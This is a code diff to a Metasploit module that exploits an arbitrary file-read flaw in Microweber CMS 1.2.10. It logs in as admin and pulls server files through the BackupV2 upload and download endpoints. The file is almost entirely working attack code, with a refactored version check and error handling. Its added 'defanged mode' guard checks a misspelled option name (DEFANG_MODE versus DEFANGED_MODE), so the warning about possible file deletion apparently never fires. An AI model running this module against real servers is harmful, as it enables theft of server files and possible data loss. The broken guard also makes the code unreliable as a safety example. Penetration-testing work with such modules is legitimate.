@@ -4,6 +4,7 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
+  prepend Msf::Exploit::Remote::AutoCheck
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -23,9 +24,9 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://huntr.dev/bounties/09218d3f-1f6a-48ae-981c-85e86ad5ed8b/']
         ],
         'Notes' => {
-          'SideEffects' => [ 'ARTIFACTS_ON_DISK', 'IOC_IN_LOGS' ],
-          'Reliability' => [ 'REPEATABLE_SESSION' ],
-          'Stability' => [ 'OS_RESOURCE_LOSS' ]
+          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
+          'Reliability' => [ REPEATABLE_SESSION ],
+          'Stability' => [ OS_RESOURCE_LOSS ]
         },
         'Targets' => [
           [ 'Microweber v1.2.10', {} ]
@@ -41,41 +42,63 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'The admin\'s username for Microweber']),
         OptString.new('PASSWORD', [true, 'The admin\'s password for Microweber']),
         OptString.new('LOCAL_FILE_PATH', [true, 'The path of the local file.']),
+        OptString.new('DEFANGED_MODE', [true, 'Run in defanged mode', true])
       ]
     )
   end
 
   def check
-    check_version ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
-  end
-
-  def check_version
-    print_warning 'Triggering this vulnerability may delete the local file that is wanted to be read.'
-    print_status 'Checking Microweber\'s version.'
-
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'admin', 'login')
     })
 
+    if res.nil?
+      fail_with(Failure::Unreachable, 'Microweber CMS cannot be reached.')
+    end
+
+    print_status 'Checking if it\'s Microweber CMS.'
+
+    if res.code != 200 || !res.body.include?('Microweber')
+      print_error 'Microweber CMS has not been detected.'
+      return Exploit::CheckCode::NotFound
+    end
+
+    print_good 'Microweber CMS has been detected.'
+
+    return check_version(res.body)
+  end
+
+  def check_version(res_body)
+    print_status 'Checking Microweber\'s version.'
+
     begin
-      version = res.body[/Version:\s+\d+\.\d+\.\d+/].gsub(' ', '').gsub(':', ': ')
+      major, minor, build = res_body[/Version:\s+(\d+\.\d+\.\d+)/].gsub(/Version:\s+/, '').split('.')
+      version = Rex::Version.new("#{major}.#{minor}.#{build}")
     rescue NoMethodError, TypeError
-      return false
+      return Exploit::CheckCode::Unknown
     end
 
-    if version.include?('Version: 1.2.10')
-      print_good 'Microweber ' + version
-      return true
+    if version == Rex::Version.new('1.2.10')
+      print_good 'Microweber version ' + version.to_s
+      return Exploit::CheckCode::Appears
     end
 
-    print_error 'Microweber ' + version
-    return false
+    print_error 'Microweber version ' + version.to_s
+
+    if version < Rex::Version.new('1.2.10')
+      print_warning 'The versions that are older than 1.2.10 have not been tested. You can follow the exploitation steps of the official vulnerability report.'
+      return Exploit::CheckCode::Unknown
+    end
+
+    return Exploit::CheckCode::Safe
   end
 
   def try_login
+    print_status 'Trying to log in.'
     res = send_request_cgi({
       'method' => 'POST',
+      'keep_cookies' => true,
       'uri' => normalize_uri(target_uri.path, 'api', 'user_login'),
       'vars_post' => {
         'username' => datastore['USERNAME'],
@@ -85,31 +108,30 @@ class MetasploitModule < Msf::Auxiliary
       }
     })
 
+    if res.nil?
+      fail_with(Failure::Unreachable, 'Log in request failed.')
+    end
+
     if res.headers['Content-Type'] != 'application/json'
-      print_status res.body
-      return false
+      fail_with(Failure::UnexpectedReply, res.body)
     end
 
     json_res = res.get_json_document
 
     if res.code != 200
-      print_error 'Microweber cannot be reached.'
-      return false
+      fail_with(Failure::NotFound, res.code)
     end
 
     if !json_res['error'].nil?
-      print_error json_res['error']
-      return false
+      fail_with(Failure::UnexpectedReply, json_res['error'])
     end
 
     if !json_res['success'].nil? && json_res['success'] == 'You are logged in'
       print_good json_res['success']
-      @cookie = res.get_cookies
-      return true
+      return
     end
 
-    print_error 'An unknown error occurred.'
-    return false
+    fail_with(Failure::UnexpectedReply, 'An unknown error occurred.')
   end
 
   def try_upload
@@ -117,26 +139,28 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'upload'),
-      'cookie' => @cookie,
       'vars_get' => {
         'src' => datastore['LOCAL_FILE_PATH']
       },
       'headers' => {
-        'Referer' => datastore['SSL'] ? 'https://' + datastore['RHOSTS'] + target_uri.path : 'http://' + datastore['RHOSTS'] + target_uri.path
+        'Referer' => full_uri
       }
     })
+
+    if res.nil?
+      fail_with(Failure::Unreachable, 'Upload request failed.')
+    end
 
     if res.headers['Content-Type'] == 'application/json'
       json_res = res.get_json_document
 
       if json_res['success']
         print_good json_res['success']
-        return true
+        return
       end
     end
 
-    print_error 'Either the file cannot be read or the file does not exist.'
-    return false
+    fail_with(Failure::BadConfig, 'Either the file cannot be read or the file does not exist.')
   end
 
   def try_download
@@ -146,20 +170,23 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'download'),
-      'cookie' => @cookie,
       'vars_get' => {
         'filename' => filename
       },
       'headers' => {
-        'Referer' => datastore['SSL'] ? 'https://' + datastore['RHOSTS'] + target_uri.path : 'http://' + datastore['RHOSTS'] + target_uri.path
+        'Referer' => full_uri
       }
     })
+
+    if res.nil?
+      fail_with(Failure::Unreachable, 'Download request failed.')
+    end
 
     if res.headers['Content-Type'] == 'application/json'
       json_res = res.get_json_document
 
       if json_res['error']
-        print_error json_res['error']
+        fail_with(Failure::UnexpectedReply, json_res['error'])
         return
       end
     end
@@ -168,12 +195,18 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    if !check_version || !try_login
-      return
+    if datastore['DEFANG_MODE'] == true
+      warning = <<~EOF
+        Triggering this vulnerability may delete the local file if the web service user has the permission.
+        If you want to continue, disable the DEFANGED_MODE.
+        => set DEFANGED_MODE false
+      EOF
+
+      fail_with(Failure::BadConfig, warning)
     end
 
-    if try_upload
-      try_download
-    end
+    try_login
+    try_upload
+    try_download
   end
 end
